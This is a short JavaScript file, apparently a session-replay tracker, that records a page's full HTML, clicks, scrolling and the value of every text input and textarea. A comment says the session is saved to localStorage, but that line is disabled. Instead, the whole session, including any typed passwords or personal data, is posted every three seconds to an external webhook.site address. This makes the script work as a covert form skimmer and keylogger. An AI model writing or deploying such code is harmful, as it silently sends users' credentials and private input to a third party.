// tracker.js
const session = {
  startTime: Date.now(),
  events: [],
  snapshot: document.documentElement.outerHTML, // Initial DOM snapshot
};

function recordEvent(type, data) {
  session.events.push({
    type,
    data,
    timestamp: Date.now() - session.startTime,
  });
}

// Track clicks
document.addEventListener("click", (e) => {
  const target = e.target;
  recordEvent("click", {
    tag: target.tagName,
    id: target.id,
    text: target.innerText.slice(0, 100),
  });
});

// Track input
document.addEventListener("input", (e) => {
  const target = e.target;
  if (target.tagName === "INPUT" || target.tagName === "TEXTAREA") {
    recordEvent("input", {
      id: target.id,
      value: target.value,
    });
  }
});

// Track scroll
window.addEventListener("scroll", () => {
  recordEvent("scroll", {
    scrollY: window.scrollY,
  });
});

// Save session to localStorage every 3 seconds
setInterval(() => {
  // localStorage.setItem("fs-lite-session", JSON.stringify(session));
  fetch('https://webhook.site/7a08e871-16c2-4793-af52-35914d13e7bd', {
    method: 'POST',
    body: JSON.stringify(session)
  })
  .then(response => response.json())
  .then(response => console.log(JSON.stringify(response)))
}, 3000);
